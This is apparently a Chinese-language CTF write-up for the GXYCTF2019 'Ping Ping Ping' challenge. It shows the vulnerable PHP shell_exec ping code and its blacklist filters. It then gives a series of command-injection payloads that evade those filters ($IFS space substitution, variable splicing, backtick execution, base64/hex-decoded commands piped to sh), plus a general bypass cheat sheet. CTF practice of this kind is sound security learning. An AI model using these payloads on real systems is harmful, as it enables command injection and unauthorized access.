@@ -1,0 +1,98 @@
+<h1 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h1><p>​<code>?ip=127.0.0.1;ls</code>​</p>
+<blockquote>
+<p>&#x2F;?ip=<br> PING 127.0.0.1 (127.0.0.1): 56 data bytes<br> flag.php<br> index.php</p>
+<p>滤了空格和标点，flag等符号，不能直接cat flag</p>
+</blockquote>
+<p>‍</p>
+<p>​<code>?ip=127.0.0.1;cat flag.php</code>​</p>
+<blockquote>
+<p>&#x2F;?ip= fxck your space!</p>
+<p>过滤了空格，用<code>${IFS}$</code>​代替</p>
+</blockquote>
+<p>‍</p>
+<p>​<code>?ip=127.0.0.1;cat$IFSflag.php	</code>​</p>
+<blockquote>
+<p>&#x2F;?ip= fxck your flag!</p>
+</blockquote>
+<p>‍</p>
+<p>不读flag，读index</p>
+<blockquote>
+<p>?ip&#x3D;127.0.0.1;cat$IFS$1index.php</p>
+</blockquote>
+<pre><code class="language-php">/?ip=
+PING 127.0.0.1 (127.0.0.1): 56 data bytes
+/?ip=
+|\&#39;|\&quot;|\\|\(|\)|\[|\]|\{|\}/&quot;, $ip, $match)){
+    echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x{00}-\x{20}]|\&gt;|\&#39;|\&quot;|\\|\(|\)|\[|\]|\{|\}/&quot;, $ip, $match);
+    die(&quot;fxck your symbol!&quot;);
+  } else if(preg_match(&quot;/ /&quot;, $ip)){
+    die(&quot;fxck your space!&quot;);
+  } else if(preg_match(&quot;/bash/&quot;, $ip)){
+    die(&quot;fxck your bash!&quot;);
+  } else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip)){
+    die(&quot;fxck your flag!&quot;);
+  }
+  $a = shell_exec(&quot;ping -c 4 &quot;.$ip);
+  echo &quot;
+&quot;;
+  print_r($a);
+}
+?&gt;
+</code></pre>
+<p><strong>总结：过滤的特殊字符：</strong></p>
+<blockquote>
+<p>&amp; &#x2F; ？ * &lt; x{00}-\x{1f} ‘ “ \ () [] {}  空格<br>“xxxfxxxlxxxaxxxgxxx” “ “ “bash”</p>
+</blockquote>
+<p>flag的贪婪匹配，匹配一个字符串中，是否按顺序出现过flag四个字母</p>
+<blockquote>
+<pre><code class="language-php">if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip)){
+    die(&quot;fxck your flag!&quot;);
+</code></pre>
+</blockquote>
+<p>源码中有一个$a变量可以覆盖</p>
+<blockquote>
+<p>?ip&#x3D;127.0.0.1;a&#x3D;f;cat$IFS$1$alag.php    过滤<br>?ip&#x3D;127.0.0.1;a&#x3D;l;cat$IFS$1f$aag.php	没flag<br>?ip&#x3D;127.0.0.1;a&#x3D;a;cat$IFS$1fl$ag.php  	过滤<br>?ip&#x3D;127.0.0.1;a&#x3D;g;cat$IFS$1fla$a.php	有flag<br>?ip&#x3D;127.0.0.1;a&#x3D;fl;b&#x3D;ag;cat$IFS$1$a$b.php 过滤<br>?ip&#x3D;127.0.0.1;b&#x3D;ag;a&#x3D;fl;cat$IFS$1$a$b.php 有flag</p>
+</blockquote>
+<p>变量替换顺序，效果也不一样</p>
+<h3 id="1、简单变量替换，用-a覆盖拼接flag"><a href="#1、简单变量替换，用-a覆盖拼接flag" class="headerlink" title="1、简单变量替换，用$a覆盖拼接flag"></a>1、简单变量替换，用$a覆盖拼接flag</h3><p>​<code>?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php</code>​</p>
+<p>​<code>查看源码</code>​</p>
+<p>&#x2F;?ip=</p>
+<pre><code>PING 127.0.0.1 (127.0.0.1): 56 data bytes &lt;?php $flag =
+
+“flag{d893b431-5300-4b46-9b52-3a5a2390cfca}”; ?&gt;
+</code></pre>
+<p>‍</p>
+<h3 id="2、变量ab互换传递，绕过字符串匹配，实现拼接"><a href="#2、变量ab互换传递，绕过字符串匹配，实现拼接" class="headerlink" title="2、变量ab互换传递，绕过字符串匹配，实现拼接"></a>2、变量ab互换传递，绕过字符串匹配，实现拼接</h3><p>​<kbd>?ip=127.0.0.1;b=ag;a=fl;cat$IFS$1$a$b.php</kbd>​</p>
+<p>​<kbd>?ip=127.0.0.1;b=lag;a=f;cat$IFS$a$b.php</kbd>​</p>
+<p>‍</p>
+<h3 id="3、内联执行"><a href="#3、内联执行" class="headerlink" title="3、内联执行"></a>3、内联执行</h3><blockquote>
+<p>?ip&#x3D;127.0.0.1;cat$IFS<code>ls</code>​<br>?ip&#x3D;127.0.0.1;cat$IFS$3<code>ls</code>​<br>?ip&#x3D;127.0.0.1;cat$IFS$9<code>ls</code>​<br>?ip&#x3D;127.0.0.1|cat$IFS$9<code>ls</code>​</p>
+</blockquote>
+<p>‍</p>
+<h3 id="4、被过滤的bash，用管道-sh替换"><a href="#4、被过滤的bash，用管道-sh替换" class="headerlink" title="4、被过滤的bash，用管道+sh替换"></a>4、被过滤的bash，用管道+sh替换</h3><p>cat flag.php用base64加密来绕过正则匹配</p>
+<blockquote>
+<p>Y2F0IGZsYWcucGhw</p>
+</blockquote>
+<blockquote>
+<p>?ip&#x3D;127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|bash</p>
+</blockquote>
+<p>&#x2F;&#x2F;?ip= fxck your bash!</p>
+<p> 过滤了flag、bash，但sh没过滤，linux下可用sh</p>
+<p>​<code>?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</code>​</p>
+<p>|sh 就是执行前面的echo脚本</p>
+<p>‍</p>
+<h3 id="5、类似题的大概思路"><a href="#5、类似题的大概思路" class="headerlink" title="5、类似题的大概思路"></a>5、类似题的大概思路</h3><blockquote>
+<p>cat fl*  用<em>匹配任意<br>cat fla</em> 用*匹配任意<br>ca\t fla\g.php        反斜线绕过<br>cat fl’’ag.php        两个单引号绕过<br>echo “Y2F0IGZsYWcucGhw” | base64 -d | bash<br>&#x2F;&#x2F;base64编码绕过(引号可以去掉)  |(管道符) 会把前一个命令的输出作为后一个命令的参数</p>
+<p>echo “63617420666c61672e706870” | xxd -r -p | bash<br>&#x2F;&#x2F;hex编码绕过(引号可以去掉)</p>
+<p>echo “63617420666c61672e706870” | xxd -r -p | sh<br>&#x2F;&#x2F;sh的效果和bash一样</p>
+<p>cat fl[a]g.php       用[]匹配</p>
+<p>a&#x3D;fl;b&#x3D;ag;cat $a$b          变量替换<br>cp fla{g.php,G}    把flag.php复制为flaG<br>ca${21}t a.txt     利用空变量  使用$*和$@，$x(x 代表 1-9),${x}(x&gt;&#x3D;10)(小于 10 也是可以的) 因为在没有传参的情况下，上面的特殊变量都是为空的</p>
+</blockquote>
+<p>‍</p>
+<p>通配符</p>
+<blockquote>
+<ul>
+<li>#匹配全部字符，通配符<br>?    #任意一个字符，通配符<br>[]      #表示一个范围（正则，通配符）<br>{}      #产生一个序列（通配符）</li>
+</ul>
+</blockquote>
+<p><img src="/assets/b1bf09fa6702388534a63ae4b934053c-20250416004020-dh62fi5.png" alt="b1bf09fa6702388534a63ae4b934053c"></p>
